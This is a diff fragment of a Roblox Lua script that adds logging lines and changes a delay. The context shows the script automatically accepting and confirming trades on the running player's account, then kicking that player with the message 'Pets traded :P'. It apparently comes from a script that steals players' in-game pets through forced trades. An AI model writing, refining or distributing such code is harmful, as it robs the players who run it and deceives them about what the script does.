@@ -115,8 +115,10 @@ while true do
 
             task.wait(2)
             remote:FireServer("TradeAccept")
-            task.wait(5)
+            print("Accepted trade")
+            task.wait(10)
             remote:FireServer("TradeConfirm")
+            print("Confirmed trade")
             task.wait(15)
             game.Players.LocalPlayer:Kick("Pets traded :P")
         end
